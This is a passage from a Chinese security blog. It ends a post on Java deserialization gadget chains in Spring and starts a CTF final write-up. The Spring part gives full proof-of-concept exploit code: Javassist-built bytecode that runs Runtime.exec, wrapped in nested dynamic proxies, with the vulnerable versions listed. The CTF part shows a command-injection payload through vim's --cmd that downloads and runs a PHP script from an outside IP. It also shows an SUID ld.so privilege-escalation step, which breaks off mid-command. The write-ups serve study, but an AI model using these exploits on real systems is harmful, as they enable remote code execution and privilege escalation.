  AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>                <span class="hljs-keyword">return</span> toStringImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>                <span class="hljs-keyword">return</span> hashCodeImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>                <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>        <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>            <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>        <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>            result = cloneArray(result);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invoke</code>的返回值在<code>memberValues</code>中找，key为<code>method</code>方法名。可以返回任意对象。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>TypeProvider#getType</code>返回的是<code>Type</code>接口类，我们可以让一个动态代理类去代理<code>Type</code>接口。</p><p>由于接下来<code>ReflectionUtils.invokeMethod(method, this.provider.getType());</code>要调用<code>newTransformer</code>，因此我们这个代理类除了代理<code>Type</code>接口类，还得代理<code>Templates</code>接口类（才能获取到接口类的方法）</p><p>获取到的动态代理类Proxy1有如下方法：</p><p><img src="/2024/08/12/Spring/image-20240812230157822.png" alt="image-20240812230157822"></p><p>那如何让<code>TypeProvider#getType</code>返回我们的<code>(Type)Proxy1</code>呢，也是再套一层动态代理，代理<code>TypeProvider</code>接口类，利用<code>AnnotationInvocationHandler</code>返回<code>Proxy1</code>，即设置<code>memberValues.put(&quot;getType&quot;, Proxy1)</code></p><p><code>Proxy1</code>的调用处理器设置为<code>ObjectFactoryDelegatingInvocationHandler</code>，这样就能把<code>newTransformer</code>的调用委托给<code>ObjectFactory#getObject</code>的返回对象去调用了。</p><p>让<code>ObjectFactory#getObject</code>返回<code>TemplatesImpl</code>即可，到此有两条路可走，继续套动态代理或寻找<code>ObjectFactory</code>的实现类（翻了一下发现不好构造，还是没有动态代理来得优雅）</p><p>继续套一层动态代理，代理<code>ObjectFactory&lt;?&gt;</code>泛型接口，利用<code>AnnotationInvocationHandler</code>返回<code>TemplatesImpl</code>，即设置<code>memberValues.put(&quot;getObject&quot;, TemplatesImpl)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        Class&lt;?&gt; clazz1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con1 = clazz1.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con1.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;String, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map1.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler1</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map1);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler1);<br><br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(factory);<br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><p>在Spring1链基础上有所变化，把<code>spring-beans</code>的<code>ObjectFactoryDelegatingInvocationHandler</code>换成<code>spring-aop</code>的<code>JdkDynamicAopProxy</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkDynamicAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AopProxy</span>, InvocationHandler, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AdvisedSupport advised;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JdkDynamicAopProxy</span><span class="hljs-params">(AdvisedSupport config)</span> <span class="hljs-keyword">throws</span> AopConfigException &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-built_in">this</span>.advised = config;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/12/Spring/image-20240812230621109.png" alt="image-20240812230621109"></p><p><img src="/2024/08/12/Spring/image-20240812230629311.png" alt="image-20240812230629311"></p><p><code>JdkDynamicAopProxy</code>将方法调用委托给了<code>AdvisedSupport</code>的<code>target</code>成员</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        as.setTarget(templates);<br><br>        Class&lt;?&gt; clazz0 = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; con0 = clazz0.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con0.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">aopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con0.newInstance(as);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aopProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopInvocationHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, aopProxy);<br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(Target.class, map2);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>)&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上POC依赖版本：</p><p>· spring-beans : 4.1.4.RELEASE</p><p>· spring-core : 4.1.4.RELEASE</p><p>· spring-aop : 4.1.4.RELEASE</p><p>· jdk 1.7</p><hr><p>下集预告：超级重头戏，<strong>Hessian</strong>.</p><hr><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/spring">Spring | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">Java 反序列化漏洞（三） - CB&#x2F;Groovy&#x2F;Hibernate&#x2F;Spring | 素十八 (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jqctf-final</title>
    <link href="/2024/08/11/jqctf-final/"/>
    <url>/2024/08/11/jqctf-final/</url>
    
    <content type="html"><![CDATA[<p>学长们打到第一了，tql。</p><p>由于很多环节都没有，这里就做个简单的wp记录。</p><h1 id="ldvim"><a href="#ldvim" class="headerlink" title="ldvim"></a>ldvim</h1><p>签到题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;filename&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||\\=|\\*|\\%|\\\^|\\(|\\)|&#123;|\\[|\\\\|&gt;|&lt;)/is&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;--help&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//view the file</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;vim &quot;</span> . <span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl命令下载php脚本到 /tmp</span><br>/?filename=--cmd <span class="hljs-string">&quot;! wget http://30.222.0.114:8888/test.php -O /tmp/a123.php&quot;</span><br><span class="hljs-comment"># 执行</span><br>/?filename=--cmd <span class="hljs-string">&quot;! php /tmp/a123.php&quot;</span><br><span class="hljs-comment"># suid提权，ld-2.31.so有s标</span><br>/lib/x86_64-linux-gnu/ld-2.31.so /bin/cat 